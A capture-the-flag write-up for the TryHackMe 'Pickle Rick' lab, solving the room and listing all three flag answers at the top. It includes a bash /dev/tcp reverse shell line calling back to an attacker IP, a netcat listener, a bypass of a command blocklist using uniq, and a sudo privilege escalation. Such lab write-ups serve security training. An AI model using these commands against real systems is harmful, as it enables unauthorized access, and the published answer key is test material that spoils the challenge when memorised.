# Tryhackme.com Room : Pickle Rick
`https://tryhackme.com/room/picklerick`


# Instance
```
export IP=10.10.233.139
```

# Task 1
This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

1. First Ingredient

```
mr. meeseek hair
```

2. Second Ingredient

```
1 jerry tear
```

3. Third Ingredient

```
fleeb juice
```


# Walkthrough
We go to the Webserver server and find a message from rick.

Inspecting the html, we find some comments with :
```
Username : R1ckRul3s
```

Robots.txt contains :
```
Wubbalubbadubdub
```

There is probably some login page somewhere, let's gobuster it `gobuster dir -w /usr/share/dirb/wordlists/big.txt -u http://$IP/`

Didn't find much with gobuster.. waiting for the result of /usr/share/wordlists/big.txt

```

```

The gobuster run with common.txt did find `/assets` folder which index all images.
One is named `portal.png`

I tried /portal & /portal.php

Go redirected to login.php

Tried 
```
Username : R1ckRul3s
password : Wubbalubbadubdub
```

We are logged in but can only access the command page.

We can execute bash commands directly.
Some commands are disallowed tho.

We can see them by `uniq portal.php`. We then need to inspect to see the code since it is interpreted by the browser:
```
cat
head
more
tail
nano
vim
vi
```

We use uniq to print the output `uniq Sup3rS3cretPickl3Ingred.txt`
```
mr. meeseek hair
```

Which is the first ingredient.

Then, the clue.txt file says `Look around the filesystem`.

We find the second ingredient with `uniq "/home/rick/second ingredients"`

```
1 jerry tear
```

We can get a reverse shell with :
`/bin/bash -c 'bash -i >& /dev/tcp/10.2.13.34/4444 0>&1'`
In the web Input

And 
`nc 10.2.13.34 4444 –e /bin/bash`
On my machine

The session is rather bad tho, no autocomplete, etc. There is a way to fix this. didnt bother

Looking at sudoers file, seems like www-data can execute anything with sudo without password
So we just need to
```
sudo su
cd /root
cat 3rd.txt
```

And we get the last ingredient :
```
fleeb juice
```

Done
